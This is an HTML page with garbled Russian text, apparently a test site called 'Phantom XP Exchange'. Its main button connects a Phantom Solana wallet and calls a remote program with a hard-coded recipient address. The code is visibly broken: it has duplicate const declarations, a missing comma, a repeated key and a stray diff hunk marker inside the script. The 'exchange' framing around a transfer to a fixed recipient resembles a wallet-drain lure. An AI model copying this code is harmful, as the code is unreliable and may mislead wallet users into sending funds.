<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Phantom XP Exchange</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body style="font-family: sans-serif; background: #f4f4f4;">

<div style="display: flex; flex-direction: column; gap: 20px; max-width: 90%; margin: 40px auto; padding: 20px; box-sizing: border-box;">

  <!-- üîó –ö–Ω–æ–ø–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∏ –≤—ã–∑–æ–≤–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ -->
  <button id="connectButton" style="padding: 18px 24px; font-size: 20px; border-radius: 12px; font-weight: bold;">
    ü™ô –û–±–º–µ–Ω—è—Ç—å XP
  </button>

  <!-- üì≤ –ö–Ω–æ–ø–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∏—è Phantom App -->
  <a href="https://phantom.app/ul/browse?ref=https%3A%2F%2Fdimer101.github.io%2Fphantom_test0%2F" target="_blank" rel="noopener noreferrer">
    <button style="padding: 18px 24px; font-size: 20px; border-radius: 12px; font-weight: bold; width: 100%;">
      üì± –û—Ç–∫—Ä—ã—Ç—å Phantom
    </button>
  </a>

  <!-- üìã –ö–Ω–æ–ø–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è —Å—Å—ã–ª–∫–∏ -->
  <button onclick="copySiteLink()" style="padding: 18px 24px; font-size: 20px; border-radius: 12px; font-weight: bold;">
    üîó –°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É –¥–ª—è Phantom
  </button>

</div>

<script>
  // –ö–æ–ø–∏—Ä–æ–≤–∞—Ç—å —Å—Å—ã–ª–∫—É
  function copySiteLink() {
    const link = "https://dimer101.github.io/phantom_test0/";
    navigator.clipboard.writeText(link)
      .then(() => alert("–°—Å—ã–ª–∫–∞ —Å–∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∞! –û—Ç–∫—Ä–æ–π Phantom, –∑–∞–π–¥–∏ –≤ Browser –∏ –≤—Å—Ç–∞–≤—å —Å—Å—ã–ª–∫—É."))
      .catch(() => alert("–û—à–∏–±–∫–∞ –∫–æ–ø–∏—Ä–æ–≤–∞–Ω–∏—è. –í—Å—Ç–∞–≤—å—Ç–µ –≤—Ä—É—á–Ω—É—é: " + link));
  }
</script>

<!-- –ú–æ–¥—É–ª—å–Ω—ã–π —Å–∫—Ä–∏–ø—Ç –¥–ª—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫–æ—à–µ–ª—å–∫–∞ –∏ –≤—ã–∑–æ–≤–∞ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞ -->
<script type="module">
  import { Connection, PublicKey } from "https://esm.sh/@solana/web3.js";
  import { Program, AnchorProvider, web3 } from "https://esm.sh/@project-serum/anchor";
  import idl from "https://raw.githubusercontent.com/dimer101/sol_helper/refs/heads/main/sol_helper.json" assert { type: "json" };

  const programId = new PublicKey("H7p9WfN8hdozwak338EJZs3FrkvubyufHSzHRJzBCaGe");
  const recipient = new PublicKey("4CeTBGmYG7SFV9aGi4rCSX1Hu483RkPmtrJhiFp9S1Wx");
  const connection = new Connection("https://api.devnet.solana.com");

  const provider = new AnchorProvider(connection, window.solana, {
    commitment: "processed"
  });

  const connection = new Connection("https://api.devnet.solana.com"); // –º–æ–∂–Ω–æ –∑–∞–º–µ–Ω–∏—Ç—å –Ω–∞ mainnet
  const provider = new AnchorProvider(connection, window.solana, { commitment: "processed" });
  const program = new Program(idl, programId, provider);

  async function exchangeXp() {
    try {
      const tx = await program.methods.run().accounts({
        user: provider.wallet.publicKey,
        recipient: recipient,
        systemProgram: web3.SystemProgram.programId
        systemProgram: web3.SystemProgram.programId,
      }).rpc();

      alert("‚úÖ –¢—Ä–∞–Ω–∑–∞–∫—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!\nTX ID: " + tx);
@@ -25,12 +69,17 @@
    }
  }

  // –ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∏ –∑–∞–ø—É—Å–∫ –∫–æ–Ω—Ç—Ä–∞–∫—Ç–∞
  document.getElementById("connectButton").addEventListener("click", async () => {
    try {
      await window.solana.connect();
      await exchangeXp();
    } catch (err) {
      console.error("–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è:", err);
      alert("–û—à–∏–±–∫–∞ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è –∫ Phantom.");
    }
  });
</script>

</body>
</html>
